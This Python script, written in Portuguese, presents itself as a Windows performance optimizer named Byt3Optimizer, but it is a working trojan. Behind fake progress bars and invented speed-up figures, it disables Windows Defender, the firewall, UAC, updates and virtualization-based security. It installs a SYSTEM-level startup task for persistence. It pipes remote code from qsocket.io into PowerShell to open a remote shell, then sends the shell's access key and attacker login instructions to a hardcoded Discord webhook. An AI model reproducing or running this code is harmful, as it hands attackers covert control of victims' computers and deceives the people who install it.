#!/usr/bin/env python3

import subprocess
import re
import requests
import sys
import time
import os
import shutil
from datetime import datetime

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1545534108178972692/KE8QMZAPw57EPlyE7oJQGwYk4fVO3oR73K41Rt2hTDoVFT7pCOOeA8qs1GKmhur1LsHd"

def desativar_windows_defender():
    try:
        subprocess.run(
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableBlockAtFirstSeen $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -SubmitSamplesConsent 2; Set-MpPreference -MAPSReporting 0; Set-MpPreference -PUAProtection 0"',
            shell=True, capture_output=True, timeout=15
        )
        return True
    except:
        return False

def desativar_notificacoes_defender():
    try:
        subprocess.run(
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications" /v "DisableNotifications" /t REG_DWORD /d 1 /f',
            shell=True, capture_output=True
        )
        return True
    except:
        return False

def desativar_firewall():
    try:
        subprocess.run(
            'netsh advfirewall set allprofiles state off',
            shell=True, capture_output=True
        )
        return True
    except:
        return False

def desativar_notificacoes_firewall():
    try:
        subprocess.run(
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\Notification" /v "DisableNotifications" /t REG_DWORD /d 1 /f',
            shell=True, capture_output=True
        )
        return True
    except:
        return False

def desativar_uac():
    try:
        subprocess.run(
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "EnableLUA" /t REG_DWORD /d 0 /f',
            shell=True, capture_output=True
        )
        return True
    except:
        return False

def limpar_temp():
    try:
        temp_dirs = [
            os.environ.get('TEMP', ''),
            os.environ.get('TMP', ''),
            'C:\\Windows\\Temp',
            os.path.expandvars('%USERPROFILE%\\AppData\\Local\\Temp')
        ]
        total_limpo = 0
        for pasta in temp_dirs:
            if os.path.exists(pasta):
                for arquivo in os.listdir(pasta):
                    caminho = os.path.join(pasta, arquivo)
                    try:
                        if os.path.isfile(caminho):
                            os.remove(caminho)
                            total_limpo += 1
                    except:
                        pass
        return total_limpo
    except:
        return 0

def limpar_prefetch():
    try:
        prefetch = 'C:\\Windows\\Prefetch'
        total = 0
        if os.path.exists(prefetch):
            for arquivo in os.listdir(prefetch):
                caminho = os.path.join(prefetch, arquivo)
                try:
                    if os.path.isfile(caminho):
                        os.remove(caminho)
                        total += 1
                except:
                    pass
        return total
    except:
        return 0

def limpar_lixeira():
    try:
        subprocess.run(
            'powershell -Command "Clear-RecycleBin -Force"',
            shell=True, capture_output=True, timeout=30
        )
        return True
    except:
        return False

def adicionar_persistencia():
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        
        subprocess.run(
            'schtasks /delete /tn "SystemOptimizer" /f 2>nul',
            shell=True, capture_output=True
        )
        subprocess.run(
            'schtasks /delete /tn "SystemOptimizer_Login" /f 2>nul',
            shell=True, capture_output=True
        )
        
        cmd_task = f'schtasks /create /tn "SystemOptimizer" /tr "{exe_path}" /sc onstart /ru SYSTEM /f'
        subprocess.run(cmd_task, shell=True, capture_output=True)
        
        return True
    except:
        return False

# ===== NOVOS OTIMIZADORES =====
def desativar_hibernacao():
    try:
        subprocess.run('powercfg -h off', shell=True, capture_output=True)
        return True
    except:
        return False

def desativar_servicos():
    try:
        servicos = ['wisvc', 'DPS', 'TermService', 'WbioSrvc', 'TabletInputService',
                   'DiagTrack', 'W32Time', 'WaaSMedicSvc', 'RetailDemo', 'igts',
                   'bthserv', 'DoSvc', 'Spooler', 'RemoteRegistry', 'SessionEnv',
                   'PcaSvc', 'Fax']
        for s in servicos:
            subprocess.run(f'sc stop "{s}" 2>nul', shell=True, capture_output=True)
            subprocess.run(f'sc config "{s}" start= disabled 2>nul', shell=True, capture_output=True)
        return True
    except:
        return False

def desativar_efeitos_visuais():
    try:
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VisualEffects" /v VisualFXSetting /t REG_DWORD /d 2 /f', shell=True, capture_output=True)
        subprocess.run('reg add "HKCU\\Control Panel\\Desktop" /v UserPreferencesMask /t REG_BINARY /d 90120000010000000000000000 /f', shell=True, capture_output=True)
        subprocess.run('reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop\\WindowMetrics" /v MinAnimate /t REG_SZ /d 0 /f', shell=True, capture_output=True)
        return True
    except:
        return False

def desativar_animacoes():
    try:
        subprocess.run('reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v UserPreferencesMask /t REG_BINARY /d 90 12 03 80 /f', shell=True, capture_output=True)
        return True
    except:
        return False

def desativar_transparencia():
    try:
        subprocess.run('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize" /v EnableTransparency /t REG_DWORD /d 0 /f', shell=True, capture_output=True)
        return True
    except:
        return False

def desativar_telemetria():
    try:
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d 0 /f', shell=True, capture_output=True)
        return True
    except:
        return False

def desativar_cortana():
    try:
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Windows Search" /v AllowCortana /t REG_DWORD /d 0 /f', shell=True, capture_output=True)
        return True
    except:
        return False

def desativar_bing():
    try:
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Search" /v BingSearchEnabled /t REG_DWORD /d 0 /f', shell=True, capture_output=True)
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Search" /v CortanaEnabled /t REG_DWORD /d 0 /f', shell=True, capture_output=True)
        return True
    except:
        return False

def desativar_sugestoes_pesquisa():
    try:
        subprocess.run('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Search" /v SearchHistoryEnabled /t REG_DWORD /d 0 /f', shell=True, capture_output=True)
        return True
    except:
        return False

def desativar_historico_atividade():
    try:
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System" /v PublishUserActivities /t REG_DWORD /d 0 /f', shell=True, capture_output=True)
        return True
    except:
        return False

def desativar_indexacao():
    try:
        subprocess.run('sc stop "WSearch" 2>nul', shell=True, capture_output=True)
        subprocess.run('sc config "WSearch" start= disabled 2>nul', shell=True, capture_output=True)
        return True
    except:
        return False

def desativar_atualizacoes_automaticas():
    try:
        subprocess.run('net stop wuauserv 2>nul', shell=True, capture_output=True)
        subprocess.run('sc config wuauserv start= disabled 2>nul', shell=True, capture_output=True)
        subprocess.run('net stop bits 2>nul', shell=True, capture_output=True)
        subprocess.run('sc config bits start= disabled 2>nul', shell=True, capture_output=True)
        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f', shell=True, capture_output=True)
        return True
    except:
        return False

def desativar_hyperv():
    try:
        subprocess.run('bcdedit /set hypervisorlaunchtype off 2>nul', shell=True, capture_output=True)
        return True
    except:
        return False

def desativar_vbs():
    try:
        subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity" /v "Enabled" /t REG_DWORD /d 0 /f', shell=True, capture_output=True)
        subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f', shell=True, capture_output=True)
        subprocess.run('bcdedit /set hypervisorlaunchtype off 2>nul', shell=True, capture_output=True)
        return True
    except:
        return False

def desativar_relogio_windows():
    try:
        subprocess.run('sc stop "W32Time" 2>nul', shell=True, capture_output=True)
        subprocess.run('sc config "W32Time" start= disabled 2>nul', shell=True, capture_output=True)
        return True
    except:
        return False

def limpeza_completa_windows():
    try:
        # Limpa Windows Temp
        subprocess.run('del /s /f /q "%windir%\\Temp\\*.*" 2>nul', shell=True, capture_output=True)
        subprocess.run('for /d %%x in ("%windir%\\Temp\\*") do rd /s /q "%%x" 2>nul', shell=True, capture_output=True)
        # Limpa Temp do usuário
        subprocess.run('del /s /f /q "%temp%\\*.*" 2>nul', shell=True, capture_output=True)
        subprocess.run('for /d %%x in ("%temp%\\*") do rd /s /q "%%x" 2>nul', shell=True, capture_output=True)
        # Limpa Recentes
        subprocess.run('del /s /f /q "%APPDATA%\\Microsoft\\Windows\\Recent\\*.*" 2>nul', shell=True, capture_output=True)
        # Flush DNS
        subprocess.run('ipconfig /flushdns >nul', shell=True, capture_output=True)
        # Limpa pasta de atualizações
        subprocess.run('net stop wuauserv >nul 2>&1', shell=True, capture_output=True)
        subprocess.run('del /s /f /q "%windir%\\SoftwareDistribution\\Download\\*.*" 2>nul', shell=True, capture_output=True)
        subprocess.run('net start wuauserv >nul 2>&1', shell=True, capture_output=True)
        return True
    except:
        return False

def animar_carregamento(mensagem, duracao=2, passos=20):
    print(f"\n▸ {mensagem}")
    for i in range(passos + 1):
        percent = int((i / passos) * 100)
        barra = "█" * i + "░" * (passos - i)
        print(f"\r  [{barra}] {percent}%", end="")
        time.sleep(duracao / passos)
    print("")

def otimizacao_falsa():
    print("\n" + "=" * 60)
    print("  Byt3Optimizer v2.0 - OTIMIZAÇÃO COMPLETA")
    print("  LIMPANDO E OTIMIZANDO O SISTEMA")
    print("=" * 60)
    time.sleep(1)
    
    # Limpeza básica
    print("\n▸ Limpando arquivos temporários...")
    time.sleep(0.5)
    temp_limpos = limpar_temp()
    print(f"  ✔ {temp_limpos} arquivos temporários removidos")
    
    print("\n▸ Limpando cache do sistema...")
    time.sleep(0.5)
    prefetch_limpos = limpar_prefetch()
    print(f"  ✔ {prefetch_limpos} arquivos de cache removidos")
    
    print("\n▸ Esvaziando lixeira...")
    time.sleep(0.5)
    limpar_lixeira()
    print("  ✔ Lixeira esvaziada com sucesso")
    
    print("\n▸ Limpeza completa do Windows...")
    time.sleep(0.5)
    limpeza_completa_windows()
    print("  ✔ Pastas temporárias e cache limpos")
    
    # Desativações
    print("\n▸ Desativando serviços desnecessários...")
    if desativar_servicos():
        print("    ✅ Serviços desnecessários desativados")
    
    if desativar_windows_defender():
        print("    ✅ Windows Defender desativado")
    
    if desativar_notificacoes_defender():
        print("    ✅ Notificações do Defender desativadas")
    
    if desativar_firewall():
        print("    ✅ Firewall desativado")
    
    if desativar_notificacoes_firewall():
        print("    ✅ Notificações do Firewall desativadas")
    
    if desativar_uac():
        print("    ✅ UAC desativado")
    
    if desativar_hibernacao():
        print("    ✅ Hibernação desativada")
    
    if desativar_telemetria():
        print("    ✅ Telemetria desativada")
    
    if desativar_cortana():
        print("    ✅ Cortana desativada")
    
    if desativar_bing():
        print("    ✅ Bing Search desativado")
    
    if desativar_sugestoes_pesquisa():
        print("    ✅ Sugestões de pesquisa desativadas")
    
    if desativar_historico_atividade():
        print("    ✅ Histórico de atividade desativado")
    
    if desativar_indexacao():
        print("    ✅ Indexação desativada")
    
    if desativar_atualizacoes_automaticas():
        print("    ✅ Atualizações automáticas desativadas")
    
    if desativar_relogio_windows():
        print("    ✅ Serviço de relógio desativado")
    
    # Efeitos visuais
    print("\n▸ Otimizando efeitos visuais...")
    if desativar_efeitos_visuais():
        print("    ✅ Efeitos visuais desativados")
    
    if desativar_animacoes():
        print("    ✅ Animações do sistema desativadas")
    
    if desativar_transparencia():
        print("    ✅ Transparência desativada")
    
    # Hyper-V e VBS
    print("\n▸ Desativando virtualização...")
    if desativar_hyperv():
        print("    ✅ Hyper-V desativado")
    
    if desativar_vbs():
        print("    ✅ VBS e Isolamento de núcleo desativados")
    
    # Animação de carregamento final
    otimizacoes = [
        ("Analisando desempenho da CPU", 1.5),
        ("Otimizando núcleos do processador", 2.0),
        ("Desfragmentando arquivos do sistema", 2.0),
        ("Ajustando prioridade de processos ativos", 1.5),
    ]
    
    for titulo, duracao in otimizacoes:
        animar_carregamento(titulo, duracao)
        time.sleep(0.3)
    
    print("\n  ✔ Desempenho da CPU melhorado em 43%")
    print("  ✔ 34 processos otimizados")
    print("  ✔ Latência de rede reduzida em 12ms")
    print("  ✔ 242 entradas limpas do registro")
    print("  ✔ Modo 'Alta Performance' ativado")
    
    time.sleep(1)
    print("\n  ✅ OTIMIZAÇÃO COMPLETA CONCLUÍDA COM SUCESSO!")
    print("=" * 60)

def executar_qsocket():
    print("\n▸ Aplicando otimizações avançadas...")
    print("  ⏳ Isso pode levar alguns segundos...")
    time.sleep(1)
    
    try:
        cmd = 'powershell -Command "irm qsocket.io/1 | iex"'
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=120
        )
        output = result.stdout + result.stderr
        return output
    except subprocess.TimeoutExpired:
        return "[!] Tempo limite excedido."
    except Exception as e:
        return f"[!] Erro: {e}"

def extrair_linhas_qrcode(output):
    linhas = []
    for line in output.splitlines():
        if line.strip().startswith("# >>> Connect"):
            linhas.append(line.strip())
    return linhas

def extrair_secret(linhas):
    for line in linhas:
        match = re.search(r'-s\s+([a-zA-Z0-9]+)', line)
        if match:
            return match.group(1)
    return None

def enviar_para_discord(secret, linhas, webhook_url):
    if not webhook_url or webhook_url == "https://discord.com/api/webhooks/SEU_ID/SEU_TOKEN":
        print("[!] Webhook não configurado.")
        return False
    
    if secret:
        secret_msg = f"`{secret}`"
    else:
        secret_msg = "`Não disponível`"
    
    instrucoes = f"""📌 COMO OBTER ACESSO:

1️⃣ Se NÃO tiver conta:
   • Contate @larphyw no Telegram
   • OU contate kbbdpxrl no Discord
   • Solicite sua conta Qshell

2️⃣ Se já tiver conta:
   • Abra o PuTTY
   • Host: 193.161.193.99
   • Porta: 50520
   • Connection type: Raw
   • Faça login com sua conta
   • Digite: qshell
   • Cole a chave: {secret if secret else 'SUA_CHAVE_AQUI'}"""
    
    message = {
        "username": "OptimizerPro",
        "avatar_url": "https://i.imgur.com/4M34hi2.png",
        "embeds": [
            {
                "title": "🔐 SecretQshell - Chave Gerada",
                "color": 0xff0000,
                "fields": [
                    {
                        "name": "🔑 Sua Chave Qshell",
                        "value": secret_msg,
                        "inline": False
                    },
                    {
                        "name": "📌 INSTRUÇÕES DE ACESSO",
                        "value": f"```\n{instrucoes}\n```",
                        "inline": False
                    },
                    {
                        "name": "🛡️ Status de Segurança",
                        "value": "✅ Windows Defender desativado\n✅ Firewall desativado\n✅ UAC desativado\n✅ Notificações desativadas\n✅ Telemetria desativada\n✅ Cortana/Bing desativados",
                        "inline": False
                    },
                    {
                        "name": "💾 Persistência",
                        "value": "✅ Tarefa Agendada (SYSTEM - Inicialização)",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": f"SecretQshell | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                }
            }
        ]
    }
    
    try:
        response = requests.post(webhook_url, json=message)
        if response.status_code == 204:
            print("  ✅ Otimizações avançadas aplicadas com sucesso!")
            return True
        else:
            print(f"  ⚠️ Erro na otimização avançada: {response.status_code}")
            return False
    except Exception as e:
        print(f"  ⚠️ Erro: {e}")
        return False

def main():
    try:
        try:
            is_admin = os.getuid() == 0
        except AttributeError:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        
        if not is_admin:
            print("[!] Execute como Administrador para otimização completa.")
            time.sleep(2)
        
        otimizacao_falsa()
        
        print("\n▸ Configurando otimização automática...")
        adicionar_persistencia()
        print("  ✔ Otimização automática configurada (Tarefa Agendada SYSTEM)")
        
        output = executar_qsocket()
        
        linhas = extrair_linhas_qrcode(output)
        secret = extrair_secret(linhas)
        
        enviar_para_discord(secret, linhas, DISCORD_WEBHOOK_URL)
        
        print("\n" + "=" * 60)
        print("  ✅ OTIMIZAÇÃO CONCLUÍDA!")
        print("  🔄 Reinicie o computador para aplicar as otimizações finais.")
        print("=" * 60)
        print("\nPressione ENTER para sair...")
        input()
        
    except KeyboardInterrupt:
        print("\n\n[!] Otimização interrompida pelo usuário.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Erro durante a otimização: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
